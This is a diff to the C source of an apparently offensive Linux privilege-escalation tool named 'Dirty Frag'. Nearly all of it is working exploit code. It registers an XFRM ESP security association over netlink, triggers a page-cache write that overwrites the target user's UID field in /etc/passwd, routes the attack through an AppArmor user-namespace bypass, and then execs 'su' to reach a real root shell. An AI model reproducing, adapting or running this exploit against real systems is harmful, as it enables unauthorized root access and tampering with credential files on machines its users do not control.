@@ -397,11 +397,51 @@ static int run_v6_in_userns(off_t a, uid_t b, gid_t c) {
 }
 #endif
 
+/* INNER (bypass userns): SA reg + trigger only. */
+df_result_t dirtyfrag_esp6_exploit_inner(void)
+{
+#ifdef __linux__
+    const char *user = getenv("DIRTYFAIL_TARGET_USER");
+    if (!user || !*user) {
+        log_bad("inner: DIRTYFAIL_TARGET_USER not set");
+        return DF_TEST_ERROR;
+    }
+    off_t  uid_off; size_t uid_len; char uid_str[16];
+    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
+        log_bad("inner: find_passwd_uid_field('%s') failed", user);
+        return DF_TEST_ERROR;
+    }
+    if (uid_len != 4) {
+        log_bad("inner: UID '%s' not 4 chars", uid_str);
+        return DF_TEST_ERROR;
+    }
+
+    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+    if (nl < 0) { log_bad("inner: netlink xfrm: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
+    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
+    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
+        log_bad("inner: bind netlink: %s", strerror(errno));
+        close(nl); return DF_EXPLOIT_FAIL;
+    }
+    if (!xfrm6_register_sa(nl, (const unsigned char *)MARKER)) {
+        close(nl); return DF_EXPLOIT_FAIL;
+    }
+    log_ok("inner: v6 XFRM SA registered with seq_hi='%s'", MARKER);
+    if (!trigger_store_v6(uid_off)) { close(nl); return DF_EXPLOIT_FAIL; }
+    log_ok("inner: v6 ESP-in-UDP trigger fired at uid_off=%lld", (long long)uid_off);
+    close(nl);
+    return DF_EXPLOIT_OK;
+#else
+    return DF_TEST_ERROR;
+#endif
+}
+
+/* OUTER (init ns): prompts → fork bypass child → wait → verify → su. */
 df_result_t dirtyfrag_esp6_exploit(bool do_shell)
 {
     log_step("Dirty Frag (IPv6 xfrm-ESP) — exploit");
 
-    uid_t uid = real_uid_for_target();
+    uid_t uid = getuid();
     if (uid == 0) {
         log_warn("already root in init namespace — nothing to escalate");
         return DF_OK;
@@ -425,52 +465,17 @@ df_result_t dirtyfrag_esp6_exploit(bool do_shell)
     log_warn("about to run xfrm-ESP6 page-cache write against /etc/passwd");
     log_warn("over ::1 with %d-byte padding to clear xfrm6_input size gate",
              V6_PAD_BYTES);
-    log_warn("cleanup: dirtyfail --cleanup, or `echo 3 > /proc/sys/vm/drop_caches`");
-    if (!typed_confirm("DIRTYFAIL")) {
-        log_bad("confirmation declined — aborting");
-        return DF_OK;
-    }
-    if (!ssh_lockout_check(user)) {
-        log_bad("SSH-lockout confirmation declined — aborting");
-        return DF_OK;
-    }
+    if (!typed_confirm("DIRTYFAIL")) { log_bad("confirmation declined"); return DF_OK; }
+    if (!ssh_lockout_check(user))   { log_bad("ssh-lockout declined");    return DF_OK; }
 
-#ifdef __linux__
-    if (apparmor_bypass_was_armed()) {
-        log_step("AA bypass already armed — skipping inner fork+unshare (v6)");
-        int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
-        if (nl < 0) { log_bad("netlink xfrm: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
-        struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
-        if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
-            log_bad("bind netlink: %s", strerror(errno));
-            close(nl); return DF_EXPLOIT_FAIL;
-        }
-        if (!xfrm6_register_sa(nl, (const unsigned char *)MARKER)) {
-            close(nl); return DF_EXPLOIT_FAIL;
-        }
-        log_ok("v6 XFRM SA registered with seq_hi='%s'", MARKER);
-        if (!trigger_store_v6(uid_off)) { close(nl); return DF_EXPLOIT_FAIL; }
-        log_ok("v6 ESP-in-UDP trigger fired");
-        close(nl);
-    } else {
-        pid_t child = fork();
-        if (child < 0) { log_bad("fork: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
-        if (child == 0) {
-            int rc = run_v6_in_userns(uid_off, getuid(), getgid());
-            _exit(rc);
-        }
-        int wstat = 0;
-        waitpid(child, &wstat, 0);
-        if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
-            log_bad("v6 child failed (exit %d)",
-                    WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
-            return DF_EXPLOIT_FAIL;
-        }
+    setenv("DIRTYFAIL_INNER_MODE",  "esp6", 1);
+    setenv("DIRTYFAIL_TARGET_USER", user,   1);
+
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    if (rc != DF_EXPLOIT_OK) {
+        log_bad("inner exploit failed (exit=%d)", rc);
+        return DF_EXPLOIT_FAIL;
     }
-#else
-    log_bad("dirtyfrag_esp6_exploit: Linux-only");
-    return DF_TEST_ERROR;
-#endif
 
     int v = open("/etc/passwd", O_RDONLY);
     if (v < 0) { log_bad("verify open: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
@@ -492,7 +497,7 @@ df_result_t dirtyfrag_esp6_exploit(bool do_shell)
         return DF_EXPLOIT_OK;
     }
 
-    log_ok("invoking 'su %s' — enter your own password to drop into a root shell", user);
+    log_ok("invoking 'su %s' in init namespace — enter your password for REAL root", user);
     execlp("su", "su", user, (char *)NULL);
     log_bad("execlp: %s", strerror(errno));
     return DF_EXPLOIT_FAIL;
